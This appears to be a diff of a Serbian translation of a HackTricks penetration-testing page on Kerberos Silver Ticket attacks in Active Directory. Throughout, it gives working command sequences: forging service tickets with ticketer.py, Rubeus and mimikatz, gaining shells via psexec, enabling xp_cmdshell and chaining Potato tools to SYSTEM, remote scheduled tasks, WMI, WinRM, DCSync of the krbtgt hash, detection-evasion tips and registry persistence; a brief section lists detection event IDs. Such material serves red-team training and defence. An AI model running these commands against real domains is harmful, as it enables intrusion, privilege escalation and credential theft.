@@ -6,22 +6,22 @@
 
 ## Silver ticket
 
-Napad **Silver Ticket** uključuje iskorišćavanje servisnih tiketa u Active Directory (AD) okruženjima. Ova metoda se zasniva na **dobijanju NTLM hasha servisnog naloga**, kao što je nalog računara, kako bi se falsifikovao Ticket Granting Service (TGS) tiket. Sa ovim falsifikovanim tiketom, napadač može pristupiti određenim servisima na mreži, **imitujući bilo kog korisnika**, obično sa ciljem dobijanja administratorskih privilegija. Naglašava se da je korišćenje AES ključeva za falsifikovanje tiketa sigurnije i manje detektabilno.
+Napad **Silver Ticket** podrazumeva iskorišćavanje service tickets u Active Directory (AD) okruženjima. Ovaj metod se oslanja na **preuzimanje NTLM hash-a service account-a**, kao što je computer account, kako bi se napravio falsifikovani Ticket Granting Service (TGS) ticket. Pomoću ovog falsifikovanog ticket-a, napadač može da pristupi određenim servisima na mreži, **oponašajući bilo kog korisnika**, obično sa ciljem dobijanja administrativnih privilegija. Naglašava se da je korišćenje AES ključeva za pravljenje falsifikovanih ticket-a bezbednije i teže za otkrivanje.<sup>[[1]](#references)[[2]](#references)</sup>
 
 > [!WARNING]
-> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
-> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
+> Silver Tickets je teže otkriti nego Golden Tickets zato što zahtevaju samo **hash service account-a**, a ne naloga krbtgt. Međutim, ograničeni su na konkretan servis na koji ciljaju. Pored toga, dovoljno je samo ukrasti lozinku korisnika.
+Pored toga, ako kompromitujete **lozinku account-a sa SPN-om**, tu lozinku možete da iskoristite za kreiranje Silver Ticket-a kojim se oponaša bilo koji korisnik tog servisa.
 
-### Modern Kerberos changes (AES-only domains)
+### Savremene Kerberos promene (AES-only domeni)
 
-- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES sesijske ključeve** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Uvek ekstrahujte **AES ključeve** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) za ciljani servisni nalog.
-- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
-- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
-- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.
+- Windows ažuriranja počev od **8. novembra 2022. (KB5021131)** podrazumevano koriste **AES session keys** za service tickets kada je to moguće i postepeno ukidaju RC4. Očekuje se da će DC-ovi do sredine 2026. imati RC4 **onemogućen po podrazumevanim postavkama**, pa oslanjanje na NTLM/RC4 hash-eve za silver tickets sve češće dovodi do greške `KRB_AP_ERR_MODIFIED`. Uvek preuzmite **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) za ciljani service account.<sup>[[5]](#references)</sup>
+- Ako je `msDS-SupportedEncryptionTypes` service account-a ograničen na AES, morate da napravite falsifikat pomoću `/aes256` ili `-aesKey`; RC4 (`/rc4` ili `-nthash`) neće raditi čak i ako posedujete NTLM hash.<sup>[[6]](#references)</sup>
+- gMSA/computer accounts se rotiraju svakih 30 dana; pre pravljenja falsifikata preuzmite **trenutni AES key** iz LSASS-a, Secretsdump/NTDS-a ili pomoću DCsync-a.
+- OPSEC: podrazumevano trajanje ticket-a u alatima često iznosi **10 godina**; podesite realna trajanja (npr. `-duration 600` minuta) kako biste izbegli otkrivanje zbog neuobičajeno dugog trajanja.<sup>[[6]](#references)</sup>
 
-For ticket crafting, different tools are employed based on the operating system:
+Za pravljenje ticket-a koriste se različiti alati, u zavisnosti od operativnog sistema:
 
-### Na Linuxu
+### Na Linux-u
 ```bash
 # Forge with AES instead of RC4 (supports gMSA/machine accounts)
 python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -36,7 +36,7 @@ python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-### Na Windowsu
+### Na Windows-u
 ```bash
 # Using Rubeus to request a service ticket and inject (works when you already have a TGT)
 # /ldap option is used to get domain data automatically
@@ -57,11 +57,11 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS servis je istaknut kao uobičajeni cilj za pristup fajl-sistemu žrtve, ali drugi servisi poput HOST i RPCSS takođe se mogu iskoristiti za zadatke i WMI upite.
+CIFS service je istaknut kao česta meta za pristup sistemu datoteka žrtve, ali i drugi services kao što su HOST i RPCSS mogu biti iskorišćeni za taskove i WMI upite.
 
-### Primer: MSSQL servis (MSSQLSvc) + Potato to SYSTEM
+### Primer: MSSQL service (MSSQLSvc) + Potato to SYSTEM
 
-Ako imate NTLM hash (ili AES ključ) servisnog naloga za SQL (npr. sqlsvc), možete falsifikovati TGS za MSSQL SPN i impersonate bilo kog korisnika prema SQL servisu. Odatle omogućite xp_cmdshell da izvršavate komande kao servisni nalog SQL-a. Ako taj token poseduje SeImpersonatePrivilege, povežite Potato da eskalirate privilegije na SYSTEM.
+Ako imate NTLM hash (ili AES key) SQL service account-a (npr. sqlsvc), možete forge-ovati TGS za MSSQL SPN i impersonate-ovati bilo kog user-a prema SQL service-u. Odatle omogućite xp_cmdshell da biste izvršavali komande kao SQL service account. Ako taj token ima SeImpersonatePrivilege, povežite Potato da biste izvršili privilege escalation do SYSTEM-a.<sup>[[4]](#references)</sup>
 ```bash
 # Forge a silver ticket for MSSQLSvc (AES example)
 python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -72,7 +72,7 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- Ako rezultujući kontekst ima SeImpersonatePrivilege (često tačno za service accounts), koristi Potato varijantu da dobiješ SYSTEM:
+- Ako dobijeni kontekst ima SeImpersonatePrivilege (što je često slučaj kod service account-a), koristite Potato varijantu da dobijete SYSTEM:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
@@ -91,48 +91,48 @@ Pregled Potato tehnika:
 ../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
 {{#endref}}
 
-## Dostupne usluge
+## Dostupni servisi
 
-| Service Type                               | Service Silver Tickets                                                     |
+| Tip servisa                               | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>U zavisnosti od OS-a takođe:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>U nekim slučajevima možete samo zatražiti: WINRM</p> |
 | Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
+| Windows File Share, takođe psexec          | CIFS                                                                       |
+| LDAP operations, uključujući DCSync        | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                             | krbtgt                                                                     |
 
-Korišćenjem **Rubeus** možete **zatražiti sve** ove tikete koristeći parametar:
+Korišćenjem **Rubeus** možete **zatražiti sve** ove ticket-e pomoću parametra:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event ID-ovi
+### Silver tickets Event IDs
 
 - 4624: Account Logon
 - 4634: Account Logoff
 - 4672: Admin Logon
-- **Nedostatak prethodnih 4768/4769 na DC-u** za istog klijenta/servis je čest indikator da je falsifikovani TGS predstavljen direktno servisu.
-- Nenormalno dugo trajanje tiketa ili neočekivani tip enkripcije (RC4 kada domen zahteva AES) takođe se ističu u podacima 4769/4624.
+- **Nepostojanje prethodnog 4768/4769 na DC-u** za istog klijenta/servis uobičajen je indikator da je forged TGS direktno predstavljen servisu.
+- Neuobičajeno dug vek trajanja ticketa ili neočekivani tip enkripcije (RC4 kada domain primenjuje AES) takođe se ističu u podacima 4769/4624.
 
-## Persistencija
+## Persistence
 
-Da biste sprečili da mašine rotiraju svoju lozinku na svakih 30 dana, postavite `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ili možete postaviti `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na veću vrednost od 30 dana da naznačite period rotacije kada lozinka mašine treba da bude promenjena.
+Da biste sprečili mašine da rotiraju svoju lozinku svakih 30 dana, postavite `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ili možete postaviti `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na vrednost veću od 30days kako biste označili period rotacije kada lozinku mašine treba rotirati.<sup>[[3]](#references)</sup>
 
 ## Zloupotreba Service tickets
 
-U sledećim primerima zamislimo da je tiket dobijen lažno predstavljajući se kao administratorski nalog.
+U sledećim primerima zamislimo da je ticket preuzet uz impersonaciju administratorskog naloga.
 
 ### CIFS
 
-Sa ovim tiketom moći ćete da pristupite `C$` i `ADMIN$` folderu putem **SMB** (ako su izloženi) i kopirate fajlove u deo udaljenog fajl sistema tako što ćete uraditi nešto poput:
+Pomoću ovog ticketa moći ćete da pristupite `C$` i `ADMIN$` folderima putem **SMB-a** (ako su izloženi) i kopirate fajlove u deo udaljenog filesystem-a tako što ćete uraditi nešto poput sledećeg:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Takođe ćete moći da dobijete shell na hostu ili izvršite proizvoljne komande koristeći **psexec**:
+Takođe ćete moći da dobijete shell unutar hosta ili da izvršavate proizvoljne komande koristeći **psexec**:
 
 
 {{#ref}}
@@ -141,7 +141,7 @@ Takođe ćete moći da dobijete shell na hostu ili izvršite proizvoljne komande
 
 ### HOST
 
-Sa ovom dozvolom možete da generišete zakazane zadatke na udaljenim računarima i izvršite proizvoljne komande:
+Sa ovom dozvolom možete da kreirate zakazane zadatke na udaljenim računarima i da izvršavate proizvoljne komande:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -155,7 +155,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-Sa ovim tickets možete **pokrenuti WMI na sistemu žrtve**:
+Sa ovim ticket-ima možete **izvršiti WMI na sistemu žrtve**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -174,11 +174,11 @@ Pronađite **više informacija o wmiexec** na sledećoj stranici:
 
 ### HOST + WSMAN (WINRM)
 
-Sa winrm pristupom na računaru možete mu **pristupiti** i čak dobiti PowerShell:
+Sa winrm pristupom računaru možete mu **pristupiti** i čak dobiti PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Pogledajte sledeću stranicu da saznate **više načina za povezivanje sa udaljenim hostom koristeći winrm**:
+Proverite sledeću stranicu da biste saznali **više načina za povezivanje sa udaljenim hostom pomoću winrm-a**:
 
 
 {{#ref}}
@@ -186,15 +186,15 @@ Pogledajte sledeću stranicu da saznate **više načina za povezivanje sa udalje
 {{#endref}}
 
 > [!WARNING]
-> Imajte na umu da **winrm mora biti aktivan i osluškivati** na udaljenom računaru da biste mu pristupili.
+> Imajte na umu da **winrm mora biti aktivan i da mora osluškivati** na udaljenom računaru da biste mu pristupili.
 
 ### LDAP
 
-Sa ovom privilegijom možete izvući DC bazu podataka koristeći **DCSync**:
+Sa ovom privilegijom možete izbaciti bazu podataka DC-a pomoću **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**Saznajte više o DCSync** na sledećoj stranici:
+**Saznajte više o DCSync-u** na sledećoj stranici:
 
 
 {{#ref}}
@@ -202,15 +202,13 @@ dcsync.md
 {{#endref}}
 
 
-## References
+## Reference
 
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
-- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
-- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
-- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
-
-
+- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
+- [2] [Kerberos (II): Kako napasti Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [3] [Proces lozinke machine account-a - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
+- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato putanja](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [5] [KB5021131 Kerberos hardening i zastarevanje RC4-a](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
+- [6] [Trenutne opcije Impacket ticketer.py-ja (AES/keytab/trajanje)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
 
 {{#include ../../banners/hacktricks-training.md}}
